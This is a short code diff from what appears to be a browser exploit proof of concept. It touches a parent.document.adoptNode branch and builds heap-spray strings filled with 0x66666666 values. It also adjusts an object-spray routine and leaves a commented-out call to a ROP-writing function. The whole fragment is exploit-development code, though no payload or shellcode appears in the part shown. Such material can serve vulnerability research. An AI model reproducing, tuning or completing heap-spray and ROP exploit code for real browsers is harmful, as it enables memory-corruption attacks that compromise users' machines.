@@ -77,11 +77,17 @@ if (parent.document.adoptNode) {
 	}
 	
 	var str= new Array();
+	/*
 	for(var j=0;j<0x100; j+=4){
 		str[j/4]= new String("");
 		for(var i=0;i<j/4; i++){
 			str[j/4]+= u32_to_unicode(0x66666666);
 		}
+	}
+	*/
+	var j=0x100000;
+	for(var i=0;i<j/4; i++){
+		str[0]+= u32_to_unicode(0x66666666);
 	}
 
 	//var obj= new Array();
@@ -96,7 +102,7 @@ if (parent.document.adoptNode) {
 			spray(j, repeat);
 		}
 	}
-	objspray(1000);
+	objspray(10);
 	alert("k");
 	//writerop();
 </script>
